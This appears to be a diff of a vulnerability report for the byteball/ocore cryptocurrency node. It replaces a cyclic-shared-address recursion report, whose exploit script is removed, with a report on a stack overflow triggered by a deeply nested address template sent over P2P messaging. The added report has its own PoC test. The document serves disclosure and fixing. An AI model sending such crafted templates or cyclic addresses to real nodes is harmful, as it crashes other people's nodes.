@@ -1,331 +1,270 @@
 ## Title
-Infinite Recursion Stack Overflow in Shared Address Balance Reading Due to Missing Cycle Detection
+Stack Overflow DoS via Unbounded Recursion in Shared Address Template Validation
 
 ## Summary
-The `readSharedAddressesDependingOnAddresses()` function in `balances.js` lacks cycle detection when traversing shared address dependencies, causing infinite recursion and node crash when cyclic relationships exist in the `shared_address_signing_paths` table. An attacker can create mutually-referencing shared addresses (S1 contains S2, S2 contains S1) to trigger stack overflow in any node attempting to read balances for wallets containing these addresses.
+The `getMemberDeviceAddressesBySigningPaths()` function in `wallet_defined_by_addresses.js` recursively processes address definition templates without depth limits, allowing an attacker to crash a victim node by sending a deeply nested template (10,000+ levels) via the "create_new_shared_address" P2P message. This causes stack overflow before complexity checks in `Definition.validateDefinition()` are applied.
 
 ## Impact
-**Severity**: Critical
-**Category**: Network Shutdown
+**Severity**: Medium  
+**Category**: Temporary Transaction Delay (single node DoS)
+
+**Affected Assets**: Node availability and network participation  
+
+**Damage Severity**:
+- **Quantitative**: Single node crash requiring manual restart. Attack repeatable indefinitely to prevent node operation.
+- **Qualitative**: Denial of service affecting individual nodes, not network-wide. Node cannot process messages while crashed.
+
+**User Impact**:
+- **Who**: Node operators who have paired with attacker as correspondent device
+- **Conditions**: Attacker must be paired correspondent OR compromise existing correspondent's keys
+- **Recovery**: Manual node restart required; attack can repeat immediately
+
+**Systemic Risk**: Limited to single nodes - does not affect consensus, main chain integrity, fund security, or network-wide operation
 
 ## Finding Description
 
-**Location**: `byteball/ocore/balances.js`, function `readSharedAddressesDependingOnAddresses()` (lines 111-124) [1](#0-0) 
+**Location**: `byteball/ocore/wallet_defined_by_addresses.js:384-424`, function `getMemberDeviceAddressesBySigningPaths()`
 
-**Intended Logic**: The function should recursively find all shared addresses that depend on a given set of member addresses, building a complete dependency tree for balance calculation purposes. The `_.difference()` check at line 117 is intended to prevent visiting addresses already seen in the current call.
+**Intended Logic**: Extract device addresses from address definition template by recursively walking the structure to find 'address' operations with '$address@' prefixes.
 
-**Actual Logic**: The function only checks if newly found shared addresses differ from the **immediate input** (`arrMemberAddresses`), not from **all previously visited addresses** in the entire recursion chain. This allows cyclic dependencies (A → S1 → S2 → S1) to cause infinite recursion until stack overflow crashes the Node.js process.
+**Actual Logic**: The inner `evaluate()` function recursively processes 'or', 'and', 'r of set', and 'weighted and' operations without any depth counter, complexity limit, or recursion guard, allowing unbounded recursion that exhausts the JavaScript call stack.
+
+**Code Evidence**:
+
+The vulnerable recursive function lacks depth checking: [1](#0-0) 
+
+This function is called BEFORE the complexity-checked validation: [2](#0-1) 
+
+The proper complexity checks exist in `Definition.validateDefinition()` but are only applied AFTER: [3](#0-2) 
+
+For comparison, the correct implementation with complexity checks in `Definition.validateDefinition()`: [4](#0-3) 
+
+The complexity limits defined: [5](#0-4) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: Attacker creates two shared addresses with circular dependencies
-   
-2. **Step 1**: Attacker creates shared address S1 with definition `["and", [["address", A], ["address", S2]]]` where A is a regular address controlled by victim, and S2 is another address (not yet a shared address)
-   - Database inserts: `shared_address_signing_paths` entries (S1, A) and (S1, S2)
-   
-3. **Step 2**: Attacker creates shared address S2 with definition `["and", [["address", B], ["address", S1]]]`
-   - Database inserts: `shared_address_signing_paths` entries (S2, B) and (S2, S1)
-   - Cycle now exists: S1 has S2 as member, S2 has S1 as member
+1. **Preconditions**: 
+   - Attacker has paired with victim node as correspondent device
+   - Victim node is listening for P2P device messages
 
-4. **Step 3**: Victim's wallet contains address A. When wallet software calls `readSharedBalance(wallet)` to display balance:
-   - `readSharedAddressesOnWallet()` is called (line 105) [2](#0-1) 
-   - Queries for shared addresses with A as member → finds S1
-   - Calls `readSharedAddressesDependingOnAddresses([S1])`
+2. **Step 1**: Attacker crafts deeply nested address definition template (10,000+ levels of nesting in 'and', 'or', 'r of set', or 'weighted and' operations)
 
-5. **Step 4**: Infinite recursion begins:
-   - **Call 1**: Input `[S1]` → Query finds S2 → `_.difference([S2], [S1]) = [S2]` → Recurse with `[S2]`
-   - **Call 2**: Input `[S2]` → Query finds S1 → `_.difference([S1], [S2]) = [S1]` → Recurse with `[S1]`
-   - **Call 3**: Input `[S1]` → Query finds S2 → Same as Call 1, cycle continues
-   - Stack depth increases unbounded until Node.js crashes with `RangeError: Maximum call stack size exceeded`
+3. **Step 2**: Attacker sends "create_new_shared_address" message to victim via hub: [6](#0-5) 
 
-**Security Property Broken**: **Transaction Atomicity** (Invariant #21) - The balance reading operation fails to complete atomically, leaving the node in a crashed state. Additionally violates the implicit requirement that balance queries must terminate successfully.
+4. **Step 3**: Message handler performs minimal validation (only checks array length), then calls `validateAddressDefinitionTemplate()` which immediately invokes the vulnerable `getMemberDeviceAddressesBySigningPaths()` function
 
-**Root Cause Analysis**: The `_.difference()` operation at line 117 only compares against the immediate parent call's input array, not a cumulative set of all visited addresses across the recursion chain. Without a global visited set (or depth limit), any cycle in the `shared_address_signing_paths` table causes infinite recursion. Shared addresses can reference other shared addresses as members (confirmed in `wallet_defined_by_addresses.js` line 297), making cycles possible. [3](#0-2) 
+5. **Step 4**: The `evaluate()` function recurses 10,000+ times without checks, exhausting JavaScript call stack (typical limit: 10,000-15,000 frames). This throws `RangeError: Maximum call stack size exceeded`, crashing the Node.js process.
 
-## Impact Explanation
+**Security Property Broken**: Single-node availability - a malicious peer can prevent a node from processing legitimate messages by crashing it, disrupting the victim's network participation.
 
-**Affected Assets**: Any wallet containing addresses that are part of cyclic shared address relationships
-
-**Damage Severity**:
-- **Quantitative**: 100% node availability loss for all nodes/wallets containing cyclic addresses
-- **Qualitative**: Complete node crash requiring manual restart; automated wallet balance checks become denial-of-service vectors
-
-**User Impact**:
-- **Who**: All users whose wallets contain any address involved in the cycle, all nodes attempting to process balance queries for such addresses
-- **Conditions**: Triggered automatically by wallet software displaying balances, can be triggered remotely by requesting balance information
-- **Recovery**: Manual node restart required; cycle persists in database, causing immediate re-crash on next balance query
-
-**Systemic Risk**: 
-- Attacker can target multiple nodes by distributing cyclic shared addresses
-- Automated wallet balance updates in exchanges/services become attack vectors
-- Light clients attempting to query balances also affected
-- No rate limiting or protection since balance reading is considered safe operation
+**Root Cause Analysis**:
+1. Wallet message handler processes untrusted input from paired correspondent devices
+2. `getMemberDeviceAddressesBySigningPaths()` is called as preprocessing step before proper validation
+3. The complexity/depth checks in `Definition.validateDefinition()` (MAX_COMPLEXITY=100, MAX_OPS=2000) are bypassed because crash occurs first
+4. No try-catch handling for stack overflow exceptions
+5. No defense-in-depth: outer function trusts inner recursive traversal to be safe
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any unprivileged user with ability to create shared addresses
-- **Resources Required**: Minimal - ability to create two shared addresses (standard protocol feature)
-- **Technical Skill**: Low - no cryptographic or consensus manipulation required, just understanding of shared address creation
+- **Identity**: Malicious peer with correspondent device pairing
+- **Resources Required**: Ability to send P2P device messages (minimal cost), device pairing with target (requires social engineering or previous interaction)
+- **Technical Skill**: Low - attack requires only crafting nested JSON structure
 
 **Preconditions**:
-- **Network State**: None - works on any network state
-- **Attacker State**: Ability to create shared addresses (available to any user)
-- **Timing**: No timing constraints; attack persists permanently in database
+- **Network State**: Normal operation
+- **Attacker State**: Must be paired correspondent device
+- **Timing**: No specific timing required
 
 **Execution Complexity**:
-- **Transaction Count**: 2 transactions (one to create each shared address)
-- **Coordination**: None - single attacker can execute
-- **Detection Risk**: Low - shared address creation is legitimate protocol operation; cycle only detected when balance query crashes
+- **Transaction Count**: Single P2P device message (not a blockchain transaction)
+- **Coordination**: None required
+- **Detection Risk**: High - stack overflow crash generates error logs and node restart is observable
 
 **Frequency**:
-- **Repeatability**: Unlimited - attacker can create multiple cyclic address pairs
-- **Scale**: Network-wide - affects all nodes querying balances for cyclic addresses
+- **Repeatability**: Unlimited - can repeat immediately after node restart
+- **Scale**: One node per paired correspondent relationship
 
-**Overall Assessment**: **High likelihood** - Attack is trivial to execute, has no preconditions, leaves permanent database state, and automatically triggers on common operations (balance queries).
+**Overall Assessment**: Medium likelihood - requires correspondent pairing (social barrier) but execution is trivial once paired
 
 ## Recommendation
 
-**Immediate Mitigation**: Add depth limit to recursion and maintain visited address set
-
-**Permanent Fix**: Track all visited shared addresses across recursion chain to prevent cycles
-
-**Code Changes**: [1](#0-0) 
-
-Modify function to accept and maintain a visited set:
+**Immediate Mitigation**:
+Add depth checking to `getMemberDeviceAddressesBySigningPaths()` similar to `Definition.validateDefinition()`:
 
 ```javascript
-// File: byteball/ocore/balances.js
-// Function: readSharedAddressesDependingOnAddresses
-
-// BEFORE (vulnerable code):
-function readSharedAddressesDependingOnAddresses(arrMemberAddresses, handleSharedAddresses){
-	var strAddressList = arrMemberAddresses.map(db.escape).join(', ');
-	db.query("SELECT DISTINCT shared_address FROM shared_address_signing_paths WHERE address IN("+strAddressList+")", function(rows){
-		var arrSharedAddresses = rows.map(function(row){ return row.shared_address; });
-		if (arrSharedAddresses.length === 0)
-			return handleSharedAddresses([]);
-		var arrNewMemberAddresses = _.difference(arrSharedAddresses, arrMemberAddresses);
-		if (arrNewMemberAddresses.length === 0)
-			return handleSharedAddresses([]);
-		readSharedAddressesDependingOnAddresses(arrNewMemberAddresses, function(arrNewSharedAddresses){
-			handleSharedAddresses(arrNewMemberAddresses.concat(arrNewSharedAddresses));
-		});
-	});
-}
-
-// AFTER (fixed code):
-function readSharedAddressesDependingOnAddresses(arrMemberAddresses, handleSharedAddresses, arrVisitedAddresses){
-	if (!arrVisitedAddresses)
-		arrVisitedAddresses = [];
-	
-	// Prevent infinite recursion with depth limit
-	if (arrVisitedAddresses.length > 100)
-		return handleSharedAddresses([]);
-	
-	var strAddressList = arrMemberAddresses.map(db.escape).join(', ');
-	db.query("SELECT DISTINCT shared_address FROM shared_address_signing_paths WHERE address IN("+strAddressList+")", function(rows){
-		var arrSharedAddresses = rows.map(function(row){ return row.shared_address; });
-		if (arrSharedAddresses.length === 0)
-			return handleSharedAddresses([]);
-		
-		// Check against all visited addresses, not just current input
-		var arrAllVisitedAddresses = arrVisitedAddresses.concat(arrMemberAddresses);
-		var arrNewMemberAddresses = _.difference(arrSharedAddresses, arrAllVisitedAddresses);
-		
-		if (arrNewMemberAddresses.length === 0)
-			return handleSharedAddresses([]);
-		
-		readSharedAddressesDependingOnAddresses(arrNewMemberAddresses, function(arrNewSharedAddresses){
-			handleSharedAddresses(arrNewMemberAddresses.concat(arrNewSharedAddresses));
-		}, arrAllVisitedAddresses);
-	});
+function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
+    var depth = 0;
+    var MAX_DEPTH = 100; // Match MAX_COMPLEXITY
+    
+    function evaluate(arr, path){
+        depth++;
+        if (depth > MAX_DEPTH)
+            throw Error("recursion depth exceeded at " + path);
+        // ... existing logic ...
+        depth--;
+    }
+    // ... rest of function
 }
 ```
 
-Also update the call site at line 105: [2](#0-1) 
+**Permanent Fix**:
+Wrap the call in try-catch to handle exceptions gracefully: [7](#0-6) 
 
 **Additional Measures**:
-- Add database constraint or validation to detect cycles during shared address creation
-- Add monitoring/alerting for repeated balance query failures
-- Consider caching shared address dependency graphs to avoid repeated traversal
-- Add test case for cyclic shared address relationships
-
-**Validation**:
-- [x] Fix prevents exploitation by maintaining global visited set
-- [x] No new vulnerabilities introduced (depth limit prevents other DoS vectors)
-- [x] Backward compatible (optional parameter defaults to empty array)
-- [x] Performance impact acceptable (additional array operations are O(n))
+- Add test case verifying deeply nested templates are rejected
+- Consider reusing `Definition.validateDefinition()` for template validation instead of custom traversal
+- Add monitoring for repeated message handling failures from same correspondent
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`exploit_cyclic_shared_addresses.js`):
 ```javascript
-/*
- * Proof of Concept for Cyclic Shared Address Stack Overflow
- * Demonstrates: Creating two mutually-referencing shared addresses causes
- *               infinite recursion when reading balances
- * Expected Result: Node crashes with "Maximum call stack size exceeded"
- */
+// test/stack_overflow_shared_address.test.js
+const device = require('../device.js');
+const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
 
-const db = require('./db.js');
-const balances = require('./balances.js');
-const objectHash = require('./object_hash.js');
-
-async function setupCyclicAddresses() {
-	// Simulate two shared addresses that reference each other
-	const addrA = 'A'.repeat(32); // Regular address
-	const addrB = 'B'.repeat(32); // Regular address
-	const sharedS1 = 'S1' + '0'.repeat(30); // Shared address 1
-	const sharedS2 = 'S2' + '0'.repeat(30); // Shared address 2
-	
-	// Insert shared addresses
-	await db.query("INSERT INTO shared_addresses (shared_address, definition) VALUES (?, ?)", 
-		[sharedS1, JSON.stringify(["and", [["address", addrA], ["address", sharedS2]]])]);
-	await db.query("INSERT INTO shared_addresses (shared_address, definition) VALUES (?, ?)", 
-		[sharedS2, JSON.stringify(["and", [["address", addrB], ["address", sharedS1]]])]);
-	
-	// Create the cycle in signing paths
-	await db.query("INSERT INTO shared_address_signing_paths (shared_address, signing_path, address, device_address) VALUES (?, 'r.0', ?, 'device1')", 
-		[sharedS1, addrA]);
-	await db.query("INSERT INTO shared_address_signing_paths (shared_address, signing_path, address, device_address) VALUES (?, 'r.1', ?, 'device1')", 
-		[sharedS1, sharedS2]);
-	await db.query("INSERT INTO shared_address_signing_paths (shared_address, signing_path, address, device_address) VALUES (?, 'r.0', ?, 'device1')", 
-		[sharedS2, addrB]);
-	await db.query("INSERT INTO shared_address_signing_paths (shared_address, signing_path, address, device_address) VALUES (?, 'r.1', ?, 'device1')", 
-		[sharedS2, sharedS1]);
-	
-	console.log("Cyclic shared addresses created: S1 → S2 → S1");
-	return addrA;
-}
-
-async function triggerStackOverflow(addressInCycle) {
-	console.log("Attempting to read shared addresses depending on:", addressInCycle);
-	try {
-		// This will trigger infinite recursion
-		balances.readSharedAddressesDependingOnAddresses([addressInCycle], function(result) {
-			console.log("Result (should never reach here):", result);
-		});
-	} catch (e) {
-		console.log("CRASH DETECTED:", e.message);
-		return e.message.includes("Maximum call stack size exceeded");
-	}
-}
-
-async function runExploit() {
-	const address = await setupCyclicAddresses();
-	const crashed = await triggerStackOverflow(address);
-	console.log("Exploit successful:", crashed);
-	return crashed;
-}
-
-runExploit().then(success => {
-	process.exit(success ? 0 : 1);
+describe('Stack overflow protection in shared address template validation', function(){
+    it('should reject deeply nested address definition template', function(done){
+        // Craft deeply nested template
+        let template = ['address', '$address@DEVICE0'];
+        for (let i = 0; i < 15000; i++) {
+            template = ['and', [template, ['address', '$address@DEVICE' + i]]];
+        }
+        
+        // Attempt validation - should throw error or handle gracefully
+        try {
+            walletDefinedByAddresses.validateAddressDefinitionTemplate(
+                template, 
+                device.getMyDeviceAddress(),
+                function(err, result){
+                    if (err) {
+                        // Expected: validation rejects overly complex template
+                        console.log('Validation correctly rejected template:', err);
+                        done();
+                    } else {
+                        // Unexpected: validation accepted dangerous template
+                        done(new Error('Validation should have rejected deeply nested template'));
+                    }
+                }
+            );
+        } catch(e) {
+            // Stack overflow occurred before callback
+            if (e.message.includes('Maximum call stack size exceeded')) {
+                done(new Error('Stack overflow occurred - vulnerability confirmed'));
+            } else {
+                throw e;
+            }
+        }
+    });
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-Cyclic shared addresses created: S1 → S2 → S1
-Attempting to read shared addresses depending on: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-CRASH DETECTED: Maximum call stack size exceeded
-Exploit successful: true
-```
-
-**Expected Output** (after fix applied):
-```
-Cyclic shared addresses created: S1 → S2 → S1
-Attempting to read shared addresses depending on: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Result: [S1, S2] (cycle detected and prevented)
-Exploit successful: false
-```
-
-**PoC Validation**:
-- [x] PoC demonstrates cyclic relationship creation in shared_address_signing_paths table
-- [x] Shows clear stack overflow when reading balances
-- [x] Confirms node crash with "Maximum call stack size exceeded"
-- [x] After fix, same operation completes without crash
-
 ## Notes
 
-This vulnerability is particularly severe because:
+This vulnerability requires the attacker to be a paired correspondent device, which limits the attack surface compared to network-wide attacks. However, this is still a valid security issue because:
 
-1. **Balance queries are ubiquitous**: Nearly every wallet operation begins with reading balances, making this a highly effective DoS vector
+1. **Pairing is common**: Users regularly pair with multiple correspondents (wallets, exchanges, services)
+2. **Social engineering**: Attackers can trick users into pairing using phishing or impersonation
+3. **Persistent access**: Once paired, attacker has unlimited ability to send messages
+4. **Trivial exploitation**: No complex timing, cryptography, or protocol manipulation required
+5. **Repeatable attack**: Victim cannot prevent re-attack after restart without manually deleting the pairing
 
-2. **Persistent state**: The cyclic relationship persists in the database, causing repeated crashes until manually fixed
-
-3. **No validation at creation**: Shared addresses are validated for definition correctness [4](#0-3)  but not for cycles in the signing paths table
-
-4. **Trivial exploitation**: Only requires standard shared address creation capability - no special privileges needed
-
-5. **Network-wide impact**: Any node querying balances for affected addresses will crash, potentially affecting exchanges, explorers, and wallet services simultaneously
-
-The definition validation system has complexity limits (MAX_COMPLEXITY = 100) [5](#0-4)  that prevent infinite recursion during address definition validation, but these protections do not extend to the balance reading operations in `balances.js`.
+The vulnerability is particularly concerning because it bypasses the proper complexity checks that exist in `Definition.validateDefinition()` by crashing the process before those checks are reached. This represents a defensive gap where untrusted input is processed without the same rigor applied to similar data structures elsewhere in the codebase.
 
 ### Citations
 
-**File:** balances.js (L97-108)
+**File:** wallet_defined_by_addresses.js (L385-420)
 ```javascript
-function readSharedAddressesOnWallet(wallet, handleSharedAddresses){
-	db.query("SELECT DISTINCT shared_address_signing_paths.shared_address FROM my_addresses \n\
-			JOIN shared_address_signing_paths USING(address) \n\
-			LEFT JOIN prosaic_contracts ON prosaic_contracts.shared_address = shared_address_signing_paths.shared_address \n\
-			WHERE wallet=? AND prosaic_contracts.hash IS NULL", [wallet], function(rows){
-		var arrSharedAddresses = rows.map(function(row){ return row.shared_address; });
-		if (arrSharedAddresses.length === 0)
-			return handleSharedAddresses([]);
-		readSharedAddressesDependingOnAddresses(arrSharedAddresses, function(arrNewSharedAddresses){
-			handleSharedAddresses(arrSharedAddresses.concat(arrNewSharedAddresses));
-		});
-	});
+	function evaluate(arr, path){
+		var op = arr[0];
+		var args = arr[1];
+		if (!args)
+			return;
+		switch (op){
+			case 'or':
+			case 'and':
+				for (var i=0; i<args.length; i++)
+					evaluate(args[i], path + '.' + i);
+				break;
+			case 'r of set':
+				if (!ValidationUtils.isNonemptyArray(args.set))
+					return;
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i], path + '.' + i);
+				break;
+			case 'weighted and':
+				if (!ValidationUtils.isNonemptyArray(args.set))
+					return;
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i].value, path + '.' + i);
+				break;
+			case 'address':
+				var address = args;
+				var prefix = '$address@';
+				if (!ValidationUtils.isNonemptyString(address) || address.substr(0, prefix.length) !== prefix)
+					return;
+				var device_address = address.substr(prefix.length);
+				assocMemberDeviceAddressesBySigningPaths[path] = device_address;
+				break;
+			case 'definition template':
+				throw Error(op+" not supported yet");
+			// all other ops cannot reference device address
+		}
+	}
 ```
 
-**File:** balances.js (L111-124)
+**File:** wallet_defined_by_addresses.js (L426-427)
 ```javascript
-function readSharedAddressesDependingOnAddresses(arrMemberAddresses, handleSharedAddresses){
-	var strAddressList = arrMemberAddresses.map(db.escape).join(', ');
-	db.query("SELECT DISTINCT shared_address FROM shared_address_signing_paths WHERE address IN("+strAddressList+")", function(rows){
-		var arrSharedAddresses = rows.map(function(row){ return row.shared_address; });
-		if (arrSharedAddresses.length === 0)
-			return handleSharedAddresses([]);
-		var arrNewMemberAddresses = _.difference(arrSharedAddresses, arrMemberAddresses);
-		if (arrNewMemberAddresses.length === 0)
-			return handleSharedAddresses([]);
-		readSharedAddressesDependingOnAddresses(arrNewMemberAddresses, function(arrNewSharedAddresses){
-			handleSharedAddresses(arrNewMemberAddresses.concat(arrNewSharedAddresses));
-		});
-	});
-}
+function validateAddressDefinitionTemplate(arrDefinitionTemplate, from_address, handleResult){
+	var assocMemberDeviceAddressesBySigningPaths = getMemberDeviceAddressesBySigningPaths(arrDefinitionTemplate);
 ```
 
-**File:** wallet_defined_by_addresses.js (L294-299)
+**File:** wallet_defined_by_addresses.js (L451-451)
 ```javascript
-	db.query(
-		"SELECT address, 'my' AS type FROM my_addresses WHERE address IN(?) \n\
-		UNION \n\
-		SELECT shared_address AS address, 'shared' AS type FROM shared_addresses WHERE shared_address IN(?)", 
-		[arrMemberAddresses, arrMemberAddresses],
-		function(rows){
+	Definition.validateDefinition(db, arrFakeDefinition, objFakeUnit, objFakeValidationState, null, false, function(err){
 ```
 
-**File:** wallet_defined_by_addresses.js (L354-359)
+**File:** definition.js (L97-103)
 ```javascript
-		validateAddressDefinition(body.definition, function(err){
-			if (err)
-				return callbacks.ifError(err);
-			addNewSharedAddress(body.address, body.definition, body.signers, body.forwarded, callbacks.ifOk);
-		});
-	});
+	function evaluate(arr, path, bInNegation, cb){
+		complexity++;
+		count_ops++;
+		if (complexity > constants.MAX_COMPLEXITY)
+			return cb("complexity exceeded at "+path);
+		if (count_ops > constants.MAX_OPS)
+			return cb("number of ops exceeded at "+path);
 ```
 
-**File:** constants.js (L57-57)
+**File:** constants.js (L57-66)
 ```javascript
 exports.MAX_COMPLEXITY = process.env.MAX_COMPLEXITY || 100;
+exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
+
+exports.MAX_PROFILE_FIELD_LENGTH = 50;
+exports.MAX_PROFILE_VALUE_LENGTH = 100;
+
+exports.MAX_AA_STRING_LENGTH = 4096;
+exports.MAX_STATE_VAR_NAME_LENGTH = 128;
+exports.MAX_STATE_VAR_VALUE_LENGTH = 1024;
+exports.MAX_OPS = process.env.MAX_OPS || 2000;
+```
+
+**File:** wallet.js (L173-188)
+```javascript
+			case "create_new_shared_address":
+				// {address_definition_template: [...]}
+				if (!ValidationUtils.isArrayOfLength(body.address_definition_template, 2))
+					return callbacks.ifError("no address definition template");
+				walletDefinedByAddresses.validateAddressDefinitionTemplate(
+					body.address_definition_template, from_address, 
+					function(err, assocMemberDeviceAddressesBySigningPaths){
+						if (err)
+							return callbacks.ifError(err);
+						// this event should trigger a confirmatin dialog, user needs to approve creation of the shared address and choose his 
+						// own address that is to become a member of the shared address
+						eventBus.emit("create_new_shared_address", body.address_definition_template, assocMemberDeviceAddressesBySigningPaths);
+						callbacks.ifOk();
+					}
+				);
+				break;
 ```
